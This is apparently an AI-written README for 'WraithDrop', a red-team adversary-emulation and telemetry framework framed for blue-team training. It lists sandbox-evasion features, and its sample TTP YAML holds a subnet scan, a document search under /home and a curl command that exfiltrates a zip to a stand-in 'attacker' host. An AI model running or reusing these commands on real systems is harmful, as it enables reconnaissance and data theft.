Here is a full README.md for your WraithDrop project:

# ⚔️ WraithDrop

**WraithDrop** is a stealth-oriented Red Team simulation and telemetry framework built for ethical cybersecurity research, blue team training, and adversary emulation in controlled environments.

> _“Like a shadow in the wire — it watches, it strikes, and it vanishes.”_

---

## 🚩 Key Features

- 🧠 **TTP Profiles** – YAML-based Tactical Technique Procedure chains
- 📡 **Telemetry Logging** – Encrypted local and remote telemetry collection
- 🛡️ **Evasion Modules** – Sandbox detection, fingerprinting, randomized delays
- 📊 **Live Dashboard** – Real-time WebSocket log monitoring with host grouping
- 🔐 **AES Encryption** – End-to-end secure event transmission
- 🧩 **Modular Design** – Easy to extend with custom techniques or behaviors
- 🧪 **Simulated Payloads** – No actual malware used, fully ethical

## 🚀 Quick Start

### 1. Clone the repo
```bash
git clone https://github.com/yourusername/wraithdrop.git
cd wraithdrop

2. Create and activate a virtual environment

python3 -m venv venv
source venv/bin/activate

3. Install dependencies

pip install -r requirements.txt

4. Start the dashboard server

python3 server/app.py

The dashboard will run at: http://localhost:7000
📡 Simulate Telemetry Events

Run the basic simulator:

python3 scripts/telemetry_sim.py

You can customize the simulation by editing telemetry_sim.py or creating TTP YAML files in ttp_profiles/.
🔐 AES Encryption

All telemetry data is encrypted using AES before being sent over the wire. You can modify the key and IV in utils/aes_encrypt.py to suit your security model.
🌐 Live Dashboard

The real-time dashboard listens for encrypted POST requests and displays parsed logs grouped by host. It uses Flask + Socket.IO to stream new events every 2 seconds.

    Incoming event payloads are automatically decrypted and logged.

📂 Sample TTP YAML (Coming Soon)

profile: data_exfil
steps:
  - action: scan_network
    command: nmap -sS 192.168.1.0/24
  - action: find_docs
    command: find /home -name '*.docx'
  - action: exfiltrate
    command: curl -F @docs.zip http://attacker/exfil

Support for loading and executing these is part of the planned roadmap.
🧠 Use Cases

    Blue team alert tuning and log correlation

    Red team pre-attack behavior simulation

    SOC training labs

    Custom TTP emulation for detection engineering

    Honeypot decoy behavior injection

⚠️ Legal Disclaimer

WraithDrop is intended for educational and ethical use only.
Do not deploy or simulate unauthorized actions on systems you do not own or have explicit permission to test.
